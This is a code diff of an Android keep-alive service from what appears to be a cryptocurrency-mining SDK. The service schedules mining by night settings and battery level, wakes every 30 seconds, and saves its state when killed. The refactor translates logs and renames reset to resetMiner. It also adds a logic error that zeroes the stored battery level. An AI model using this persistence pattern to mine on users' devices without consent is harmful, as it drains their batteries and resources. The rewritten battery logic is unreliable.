@@ -19,7 +19,7 @@ import waterhole.miner.core.keepAlive.AbsWorkService;
 import static waterhole.miner.core.utils.LogUtils.error;
 import static waterhole.miner.core.utils.LogUtils.info;
 
-public class TraceServiceImpl extends AbsWorkService {
+public final class TraceServiceImpl extends AbsWorkService {
 
     // 是否任务完成, 不再需要服务运行
     public static boolean sShouldStopService;
@@ -34,25 +34,24 @@ public class TraceServiceImpl extends AbsWorkService {
         public void onReceive(Context context, Intent intent) {
             String action = intent.getAction();
             if (action != null && action.equals(Intent.ACTION_BATTERY_CHANGED)) {
-                // 电池电量
                 int level = intent.getIntExtra("level", 0);
-                // 电池状态
                 int status = intent.getIntExtra("status", BatteryManager.BATTERY_STATUS_UNKNOWN);
-                info("电池电量 = " + level + " ,充电状态 = " + status);
+                info("battery level = " + level + " ,battery status = " + status);
 
                 if (nightConfig != null) {
-                    if (startBatteryLevel == 0) {
-                        startBatteryLevel = level;
-                    }
-                    if (status == BatteryManager.BATTERY_STATUS_CHARGING) {
-                        if (startBatteryLevel - level >= nightConfig.consumerChargingPower) {
-                            reset(context);
-                        }
-                    } else {
-                        if (startBatteryLevel <= nightConfig.minPower || startBatteryLevel - level >=
-                                nightConfig.consumerPower) {
-                            reset(context);
-                        }
+                    startBatteryLevel = startBatteryLevel == 0 ? level : 0;
+                    switch (status) {
+                        case BatteryManager.BATTERY_STATUS_CHARGING:
+                            if (startBatteryLevel - level >= nightConfig.consumerChargingPower) {
+                                resetMiner(context);
+                            }
+                            break;
+                        default:
+                            if (startBatteryLevel <= nightConfig.minPower
+                                    || startBatteryLevel - level >= nightConfig.consumerPower) {
+                                resetMiner(context);
+                            }
+                            break;
                     }
                 } else {
                     startBatteryLevel = 0;
@@ -60,7 +59,7 @@ public class TraceServiceImpl extends AbsWorkService {
             }
         }
 
-        private void reset(Context context) {
+        private void resetMiner(Context context) {
             nightConfig = null;
             startBatteryLevel = 0;
             cacheLastStopTimestamp(context);
@@ -105,7 +104,7 @@ public class TraceServiceImpl extends AbsWorkService {
 
     @Override
     public void startWork(Intent intent, int flags, int startId) {
-        info("keep alive: 检查磁盘中是否有上次销毁时保存的数据");
+        info("keep alive: check whether the data stored in the disk is saved during the last destruction.");
         sDisposable = Observable
                 .interval(30, TimeUnit.SECONDS)
                 // 取消任务时取消定时唤醒
@@ -115,11 +114,10 @@ public class TraceServiceImpl extends AbsWorkService {
                         info("keep alive: cancel.");
                         cancelJobAlarmSub();
                     }
-                })
-                .subscribe(new Consumer<Long>() {
+                }).subscribe(new Consumer<Long>() {
                     @Override
                     public void accept(Long count) {
-                        info("keep alive: 每 30 秒采集一次数据... count = " + count);
+                        info("keep alive: Collecting data per 30 seconds... count = " + count);
                         NightConfiguration.instance().getConfigObject(getApplicationContext(),
                                 new AsyncTaskListener<NightConfig>() {
                                     @Override
@@ -167,7 +165,7 @@ public class TraceServiceImpl extends AbsWorkService {
 
     @Override
     public void onServiceKilled(Intent rootIntent) {
-        info("keep alive: 保存数据到磁盘。");
+        info("keep alive: save data to disk");
     }
 
     private void startMine() {
